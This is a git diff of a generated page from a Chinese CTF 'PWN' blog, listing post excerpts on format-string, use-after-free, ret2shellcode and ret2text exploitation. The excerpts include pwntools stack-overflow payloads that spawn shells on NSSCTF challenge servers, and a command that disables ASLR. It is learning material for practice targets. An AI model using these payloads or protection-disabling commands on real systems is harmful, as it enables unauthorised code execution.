@@ -14,7 +14,7 @@
   localSearch: undefined,
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -50,7 +50,7 @@
   isHome: true,
   isHighlightShrink: false,
   isToc: false,
-  postUpdate: '2023-07-25 10:07:05'
+  postUpdate: '2023-07-25 21:30:50'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -139,187 +139,22 @@
       }
     }
     detectApple()
-    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">zhuyuan's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">zhuyuan's Blog</h1><div id="site-subtitle"><span id="subtitle"></span></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left"><a href="/2023/07/24/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="格式化字符串漏洞"><img class="post_bg" src="https://w.wallhaven.cc/full/yx/wallhaven-yxv257.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="格式化字符串漏洞"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/24/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="格式化字符串漏洞">格式化字符串漏洞</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="content">格式化字符串漏洞一、X86二、格式化字符串漏洞原理​	格式化串漏洞和普通的栈溢出有相似之处，但是还是有所不用。都是利用程序中存在的漏洞劫持程序流程的。
-a、什么是格式化字符串？​		像printf()、fprintf()等一系列的函数可以按照一定的格式将数据进行输出，举个例子：
-printf(&quot;Hello %s&quot;,&quot;World&quot;);
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header" style="background-image: url('/img/background.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">zhuyuan's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">zhuyuan's Blog</h1><div id="site-subtitle"><span id="subtitle"></span></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left"><a href="/2023/07/21/ret2text/" title="ret2text"><img class="post_bg" src="https://w.wallhaven.cc/full/yx/wallhaven-yxvqdd.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ret2text"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/21/ret2text/" title="ret2text">ret2text</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-20T16:00:00.000Z" title="发表于 2023-07-21 00:00:00">2023-07-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="content">ret2text一、原理控制程序执行程序本身已有的代码(.text)。这种攻击是一种笼统的描述，被称为ROP攻击，即通过面向返回编程来攻击。ROP攻击利用了程序中已经存在的代码段（称为“gadget”），并通过操纵程序的返回地址来控制程序的执行流程。
 
-​		执行完这个函数会返回字符串：Hello World
-​		这个printf函数的第一个参数就是格式化字符串，它用来告诉程序将数据以什么格式输出。
-​		printf()函数的一般形式为：printf(“format”,输出列表)，关注点在format上，它的结构是：
-%[ 标志 ] [ 输出最小宽度] [.精度] [长度] 类型，其中跟格式化字符串漏洞有关系的主要有下列几点：
-1、输出最小宽度：用十进制整数来表示输出的最少位数。若实际位数多余定义的宽度，则按实际位数输出，若实际位数少于定义的宽度则补空格或0.
-比如：
-printf(&quot;%2d&quot;,123);     //结果为123
-prin ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/07/23/%5BHNCTF%202022%20Week1%5Dret2shellcode/" title="[HNCTF 2022 Week1]ret2shellcode"><img class="post_bg" src="https://w.wallhaven.cc/full/gp/wallhaven-gp2w6e.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[HNCTF 2022 Week1]ret2shellcode"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/23/%5BHNCTF%202022%20Week1%5Dret2shellcode/" title="[HNCTF 2022 Week1]ret2shellcode">[HNCTF 2022 Week1]ret2shellcode</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-22T16:00:00.000Z" title="发表于 2023-07-23 00:00:00">2023-07-23</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="content">[HNCTF 2022 Week1]ret2shellcode一、前言简单的shellcode，但是有需要注意的点
-二、题目检查保护机制
+GCC编译ret2text文本文件:
+12gcc -fno-stack-protector -z noexecstack -no-pie -z norelro -m32 - ret2text.c -o ret2text   //编译的文件禁用栈保护、开启NX保护、关闭RELRO并且是32位sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space  //关闭进程地址随机化
 
-开启了NX不可执行保护，如果是ret2shellcode的类型，需要看一下bss段是否有执行权限。gdb中查看一下
+二、程序分析通过checksec检查程序
 
-可以看见此时还是可读可写，但是没有执行权限，到ida里面分析一下
-
-向s段写入shellcode,strcpy会传到bss段的buff，相当于向bss段写入shellcode，我们只需要将函数返回地址修改为bss段buff的入口就行。
-但是bss段没有可执行权限怎么办，这时候注意到函数中有一个mprotect函数。
-mprotect函数在Linux函数中，mprotect函数可以用来修改一段指定内存区域的访问权限
-函数原型如下：
-#include &lt;unistd.h&gt;
-#include &lt;sys/mmap.h&gt;
-int mprotect(const void *start, size_t len, int prot);
-
-mprotect函数把自己statr开始的，长度为len的内存区的保护属性修改为prot ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/07/23/%5BNISACTF%202022%5DUAF/" title="[NISACTF 2022]UAF"><img class="post_bg" src="https://w.wallhaven.cc/full/9d/wallhaven-9dr818.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[NISACTF 2022]UAF"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/23/%5BNISACTF%202022%5DUAF/" title="[NISACTF 2022]UAF">[NISACTF 2022]UAF</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-22T16:00:00.000Z" title="发表于 2023-07-23 00:00:00">2023-07-23</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="content">[NISACTF 2022]UAF一、前言写的第一道堆题，记录一下
-二、题目检查一下保护机制
-
-32位程序，开启了Canary保护和NX保护。
-程序流程是一个菜单程序，先全部把功能执行一遍
-
-创建
-输入1，创建一个编号为0的page。
-编辑
-输入2，然后选择编号，从这里可以看出，如果想编辑编号为0的page，是不允许的。先存疑，后面ida分析看伪代码时再确认
-删除输入3，再输入编号，删除这个page。
-
-打印
-输入4，再输入编号，打印这个page。
-看一下ida中伪代码
-
-可以发现这一处有后门函数system。
-main函数
-控制程序流程，看一下漏洞函数，和利用漏洞的函数
-漏洞函数
-释放堆块的时候，只释放了内存，没有将指针置为NULL，这就导致可以继续利用此指针做一些别的事情。
-这就是UAF漏洞，属于指针悬挂。
-pwngdb调试创建一个page，查看一下内存布局
-
-查看0x804b000内存
-
-0x11是此结构体的size，查看一下0x0804862b
-
-可以看到此处是echo函数地址
-
-此函数就是打印函数，也就是菜单程序中的show功能
-所以，如果我们将0x0804862b换为sys ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/07/23/%5BWUSTCTF%202020%5Dgetshell/" title="[WUSTCTF 2020]getshell"><img class="post_bg" src="https://w.wallhaven.cc/full/1p/wallhaven-1prd51.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[WUSTCTF 2020]getshell"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/23/%5BWUSTCTF%202020%5Dgetshell/" title="[WUSTCTF 2020]getshell">[WUSTCTF 2020]getshell</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-22T16:00:00.000Z" title="发表于 2023-07-23 00:00:00">2023-07-23</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="content">[WUSTCTF 2020]getshell一、前言普通的栈溢出，不过ida分析的时候要多观察一下左侧函数列表，有时候后门函数会在里面
-二、题目
-只开启了NX保护，32位程序到ida静态分析
-
-溢出点在这
-
-后门函数在这，条件全了。
-思路就是栈溢出返回地址到后门函数
-三、EXPfrom pwn import*
-
-context.log_level = &#39;debug&#39;
-context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]
-context(arch=&#39;i386&#39;, os=&#39;linux&#39;)
-
-sh = remote(&#39;node2.anna.nssctf.cn&#39;,28870)
-elf = ELF(&#39;./pwn&#39;)
-shell_addr = elf.sym[&#39;shell&#39;]
-
-payload = 0x18*b&#39;a&#39;+4*b&#39;b&#39;+p32(shell_a ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/07/23/%5BwatevrCTF%202019%5DVoting%20Machine%201/" title="[watevrCTF 2019]Voting Machine 1"><img class="post_bg" src="https://w.wallhaven.cc/full/6d/wallhaven-6dwl3x.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[watevrCTF 2019]Voting Machine 1"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/23/%5BwatevrCTF%202019%5DVoting%20Machine%201/" title="[watevrCTF 2019]Voting Machine 1">[watevrCTF 2019]Voting Machine 1</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-22T16:00:00.000Z" title="发表于 2023-07-23 00:00:00">2023-07-23</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="content">[watevrCTF 2019]Voting Machine 1一、前言写这道题时比较搞笑，被自己蠢到了。
-二、题目
-开启了NX保护，到ida中静态分析
-
-栈溢出点很明显。因为我没有在ida中寻找后门函数，我用了ROP这个工具去查system和’&#x2F;bin&#x2F;sh‘
-
-所以我以为这道题又是一道ret2libc，然后就按照ret2libc的思路去打，但是最后的溢出调用system函数时，栈顶一直不能保持16字节对齐，一直打不通，所以感觉自己写出错了，去看了下别的大佬的文章，发现居然还有个后门函数，那这样就很简单了。
-三、EXPsh = remote(&#39;node3.anna.nssctf.cn&#39;,28536)
-
-elf = ELF(&#39;./pwn&#39;)
-
-#puts_plt = 0x00400680
-
-#puts_got = elf.got[&#39;puts&#39;]
-
-#main_addr = 0x0040089F
-
-#POP_rdi = 0x004009b3
-
-#ret_addr = 0x00400812
-
-#payload = 10*b ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/07/23/%5B%E6%B7%B1%E8%82%B2%E6%9D%AF%202021%5Dfind_flag/" title="[深育杯 2021]find_flag"><img class="post_bg" src="https://w.wallhaven.cc/full/7p/wallhaven-7pje5o.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[深育杯 2021]find_flag"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/23/%5B%E6%B7%B1%E8%82%B2%E6%9D%AF%202021%5Dfind_flag/" title="[深育杯 2021]find_flag">[深育杯 2021]find_flag</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-22T16:00:00.000Z" title="发表于 2023-07-23 00:00:00">2023-07-23</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="content">[深育杯 2021]find_flag一、前言第一次碰到保护全开的题目，记录一下
-二、题目
-保护全开，第一个平时遇见的都是部分RELRO，是GCC的默认设置，完整的RELRO使整个GOT表都是可读，但是无法修改，所以这就防护了我们通过劫持__stack_chk_fail函数覆盖GOT表地址，所以只能另寻别的方法，PIE程序地址随机化，不能再直接获取函数地址，需要泄露出一处地址，然后根据偏移计算其它函数地址。
-到ida分析看一下
-
-两处溢出点加上一个格式化字符串漏洞，很明显，第一次溢出是为了输出Canary的值，既然开启了PIE无法直接确定地址，但是返回地址是main函数中的地址，如果通过printf泄露出返回地址，然后减去偏移地址，就获得了程序的基址，那这样就可以通过基址+偏移获得其它所有的地址。
-首先需要确定Canary的值和返回地址，利用printf函数的%n$p可以泄露出其内容，我们需要的就是找到格式化字符参数偏移。
-gdb中调试，断到printf函数，查看堆栈
-
-需要注意的是，这是一个64位程序，printf函数参数前6个参数是用寄存器传参，从左到右依此是rdi,rsi,rdx ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/07/22/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/" title="延迟绑定"><img class="post_bg" src="https://w.wallhaven.cc/full/ex/wallhaven-exw39r.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="延迟绑定"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/22/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/" title="延迟绑定">延迟绑定</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-21T16:00:00.000Z" title="发表于 2023-07-22 00:00:00">2023-07-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="content">延迟绑定静态链接：静态链接是将一个或多个库或目标文件（先前由编译器或汇编器生成）链接到一起，生成一个可执行文件
-程序运行速度快，但是浪费空间，更新库函数代码也困难，需要重新编译链接
-动态链接：动态链接是在程序运行时将程序与共享库链接起来，允许多个程序共享一个库。当一个程序被加载到内存中运行时，动态链接器会检查程序所需的共享库，并将它们加载到内存中，然后动态链接器也会将程序中对共享库中函数和变量的引用重定位实际的地址。
-动态链接的优点是它可以减少内存占用和磁盘空间的浪费，并且多个程序可以共享同一个库，也更容易更新升级。但是由于把链接推迟到了程序运行时，所以每次执行程序时都需要链接，性能会降低。
-因为Gcc默认是动态链接，所以为了解决动态链接缺点的问题有了延迟绑定
-延迟绑定是动态链接器用来减少程序启动时间的一种技术。延迟绑定就是在函数第一次被调用的时候再和函数地址绑定
-GOT 全称是全局偏移量表（Global Offset Table），用来存储外部函数在内存的确切地址。GOT 存储在数据段（Data Segment）内，可以在程序运行中被修改。
-PLT 全称是程序链接表（Procedur ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/07/22/%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/" title="调用约定"><img class="post_bg" src="https://w.wallhaven.cc/full/vq/wallhaven-vqdmd5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="调用约定"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/22/%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/" title="调用约定">调用约定</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-21T16:00:00.000Z" title="发表于 2023-07-22 00:00:00">2023-07-22</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="content">调用约定函数的调用约定就是函数调用时的一些规则:
-1、函数参数的压栈顺序
-2、由调用者还是被调用者把参数弹出（内平栈&#x2F;外平栈）
-3、产生函数修饰名的方法
-_cdcel是C和C++默认调用约定：
-1、从右至左依此压栈
-2、由调用者维护参数内存栈（外平栈）
-3、修饰名格式是在原函数名前加一个下划线，如_function
-_stdcallC和C++标准调用方式，Win32 API中的函数一般是这种调用方式：
-1、从右至左依此压栈
-2、被调用者维护参数内存栈（内平栈）
-3、修饰名格式是在原函数名前加一个下划线，原函数名后加一个@，如_function@
-_fastcallfastcall就是快速调用约定，通过寄存器传递参数，相比于去内存栈中读取参数，fastcall更快：
-1、使用ECX和EDX寄存器传递前两个DWORD或者更小的参数，其他参数依此从右往左依此入栈
-2、被调用者维护参数内存栈（内平栈）
-3、修饰名格式是在原函数名前和后各加一个@，并且在后面跟函数参数的字节数，如@function@16
-_thiscallC++类成员函数缺省的调用约定，在C++中，由于类成员有一个th ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2023/07/21/%5BGFCTF%202021%5Dwhere_is_shell/" title="[GFCTF 2021]where_is_shell"><img class="post_bg" src="https://w.wallhaven.cc/full/qz/wallhaven-qzll9l.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[GFCTF 2021]where_is_shell"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/21/%5BGFCTF%202021%5Dwhere_is_shell/" title="[GFCTF 2021]where_is_shell">[GFCTF 2021]where_is_shell</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-20T16:00:00.000Z" title="发表于 2023-07-21 00:00:00">2023-07-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="content">[GFCTF 2021]where_is_shell一、前言又学到一种新的提权方式。
-重点：system($0)也能拿到权限
-二、题目
-只有NX保护，ida中静态分析
-
-read函数，溢出点在这。
-
-tips函数中发现$0对应的字节码\x24\x30,所以只要把这个地址填充到system函数中充当参数，就能实现
-system($0)拿到权限。
-3、EXPfrom pwn import*
-
-sh = remote(&#39;node4.anna.nssctf.cn&#39;,28975)
-
-system_addr = 0x00400430	#system函数地址
-
-bin_sh = 0x400541			#$0  对应的地址
-ret_addr = 0x400416			#用来栈顶对齐
-    
-pop_rdi = 0x4005e3			#传递参数
-
-payload = 0x18*b&#39;a&#39;+p64(ret_addr)+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)
-
-sh.sendline(payload)
-
-sh.interactive ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2023/07/21/%5BHNCTF%202022%20Week1%5Deasyoverflow/" title="[HNCTF 2022 Week1]easyoverflow"><img class="post_bg" src="https://w.wallhaven.cc/full/d6/wallhaven-d6w763.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[HNCTF 2022 Week1]easyoverflow"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/07/21/%5BHNCTF%202022%20Week1%5Deasyoverflow/" title="[HNCTF 2022 Week1]easyoverflow">[HNCTF 2022 Week1]easyoverflow</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-20T16:00:00.000Z" title="发表于 2023-07-21 00:00:00">2023-07-21</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/CTF/PWN/">PWN</a></span></div><div class="content">[HNCTF 2022 Week1]easyoverflow一、前言比较简单，覆盖变量值，改变程序流程就行
-二、题目先检查保护
-
-64位程序，开了NX保护，到ida中静态分析一下。
-
-一处溢出，然后覆盖v5为1就行。
-三、EXPfrom pwn import*
-
-context.log_level = &#39;debug&#39;
-context.terminal = [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;bash&#39;,&#39;-c&#39;]
-context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)
-
-
-sh = remote(&#39;node3.anna.nssctf.cn&#39;,28615)
-
-payload = (0x30-0x4)*b&#39;a&#39;+p32(0x1)
-
-sh.sendline(payload)
-
-sh.interactive()                                                    
-
-四、总结简单 ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/#content-inner"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/#content-inner">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/#content-inner">4</a><a class="extend next" rel="next" href="/page/4/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">主元</div><div class="author-info__description">二进制ing</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">22</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zhuyuan1213/zhuyuan1213.github.io.git"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">献给热爱的一切~</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段"><img src="https://w.wallhaven.cc/full/we/wallhaven-wemdqr.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Canary保护机制以及常用绕过手段"/></a><div class="content"><a class="title" href="/2023/07/24/Canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E7%BB%95%E8%BF%87%E6%89%8B%E6%AE%B5/" title="Canary保护机制以及常用绕过手段">Canary保护机制以及常用绕过手段</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/2023-7-24-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出（stack）"><img src="https://w.wallhaven.cc/full/we/wallhaven-wemdqr.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="整数溢出（stack）"/></a><div class="content"><a class="title" href="/2023/07/24/2023-7-24-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" title="整数溢出（stack）">整数溢出（stack）</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式"><img src="https://w.wallhaven.cc/full/d6/wallhaven-d6wdl3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ELF文件格式"/></a><div class="content"><a class="title" href="/2023/07/24/ELF%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/" title="ELF文件格式">ELF文件格式</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/NSSCTF-babyof/" title="NSSCTF-babyof"><img src="https://w.wallhaven.cc/full/ex/wallhaven-exwgv8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NSSCTF-babyof"/></a><div class="content"><a class="title" href="/2023/07/24/NSSCTF-babyof/" title="NSSCTF-babyof">NSSCTF-babyof</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/24/NSSCTF-whitegive_pwn/" title="NSSCTF-whitegive_pwn"><img src="https://w.wallhaven.cc/full/rr/wallhaven-rrjvyq.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NSSCTF-whitegive_pwn"/></a><div class="content"><a class="title" href="/2023/07/24/NSSCTF-whitegive_pwn/" title="NSSCTF-whitegive_pwn">NSSCTF-whitegive_pwn</a><time datetime="2023-07-23T16:00:00.000Z" title="发表于 2023-07-24 00:00:00">2023-07-24</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+32位程序小端存储，除了NX栈不可执行开启，其它都是关闭状态。因为开启了栈不可执行，所以无法在栈中进行跳转，那么就考虑调用程序本身的函数，或者使用ROP技术获取gadget
